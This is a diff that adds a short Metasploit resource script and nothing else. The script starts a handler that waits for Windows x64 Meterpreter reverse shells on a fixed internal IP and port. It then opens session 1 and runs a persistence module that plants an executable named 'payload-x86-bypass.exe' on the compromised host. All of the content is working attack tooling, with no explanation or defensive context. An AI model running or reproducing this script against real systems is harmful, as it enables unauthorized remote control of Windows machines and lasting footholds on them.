@@ -1,0 +1,10 @@
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter_reverse_tcp
+set LHOST 10.17.20.97
+set LPORT 4443
+run -j
+
+sleep 10
+
+sessions 1
+run post/windows/manage/persistence_exe SESSION=1 REXEPATH=/home/hihat/payloads/payload-x86-bypass.exe
